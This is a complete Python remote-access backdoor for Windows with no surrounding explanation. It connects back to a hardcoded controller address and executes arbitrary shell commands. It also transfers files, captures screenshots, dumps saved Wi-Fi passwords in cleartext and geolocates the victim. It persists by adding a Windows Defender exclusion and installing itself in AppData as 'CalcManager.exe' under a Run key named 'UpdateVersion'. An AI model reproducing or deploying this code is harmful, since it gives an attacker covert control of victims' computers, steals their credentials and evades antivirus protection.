import socket
import subprocess
import json
import sys
import os
import time
import pyautogui
import re
import shutil
from urllib.request import urlopen


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ip = ip
        self.port = port
        self.connect()

    def connect(self):
        while True:
            try:
                self.connection.connect((self.ip, self.port))
                break
            except Exception:
                time.sleep(20)

    def wifi(self):
        command = 'netsh wlan show profile'
        networks = subprocess.check_output(command, shell=True)
        result = re.findall(b'(?:Profile\s*:\s)(.*)', networks)
        res = [r.decode() for r in result]
        passwords = []

        for n in res:
            comm = f'netsh wlan show profile {n} key=clear'
            content = subprocess.check_output(comm, shell=True)
            password = re.findall(b'(?:Key\sContent\s*:\s)(.*)', content)
            name = re.findall(b'(?:SSID\sname\s*:\s)(.*)', content)
            passwords.append({name[0].decode().rstrip(): password[0].decode().rstrip()})

        return passwords

    def screenshot(self):
        screen = pyautogui.screenshot()
        screen.save('scr.png')

    def command_exec(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).rstrip()

    def send_data(self, data):
        try:
            json_data = json.dumps(data.decode("ISO-8859-1"))
            self.connection.send(json_data.encode("ISO-8859-1"))
        except Exception:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode("ISO-8859-1"))

    def receive_data(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode("ISO-8859-1")
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, name, data):
        with open(name, 'wb') as file:
            file.write(data.encode("ISO-8859-1"))
            return 'File downloaded successfully'

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return file.read()
        except Exception:
            return ''

    def persistence(self):
        env = os.environ['appdata']
        location = env + '\\CalcManager.exe'
        exclusion = f'powershell -Command Add-MpPreference -ExclusionPath "{env}"'
        subprocess.call(exclusion, shell=True)

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call(f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v UpdateVersion /t REG_SZ /d "{location}"', shell=True)

    def run(self):
        while True:
            command = self.receive_data()
            print(f'command: {command}')
            data = None

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()

                elif command[0] == 'download':
                    file = self.read_file(command[1])
                    data = file

                elif command[0] == 'upload':
                    self.write_file(command[1], command[2])
                    data = 'Uploaded succesfully'

                elif command[0] == 'screenshot':
                    self.screenshot()
                    data = self.read_file('scr.png')
                    os.remove('scr.png')

                elif command[0] == 'cd' and len(command) > 1:
                    os.chdir(command[1])
                    data = f'Directory has been changed to {os.getcwd()}'

                elif command[0] == 'wifi':
                    data = self.wifi()

                elif command[0] == 'user_data':
                    url = 'http://ipinfo.io/json'
                    response = urlopen(url)
                    data = json.load(response)

                elif command[0] == 'persist':
                    self.persistence()
                    data = 'persisting'

                else:
                    data = self.command_exec(command)

            except Exception as exc:
                data = f'Error during command execution: {exc}'

            try:
                self.send_data(data.encode("ISO-8859-1"))
            except AttributeError:
                self.send_data(data)


if __name__ == '__main__':
    try:
        process = Backdoor('192.168.31.151', 6666)
        process.run()
    except Exception as exc:
        sys.exit()
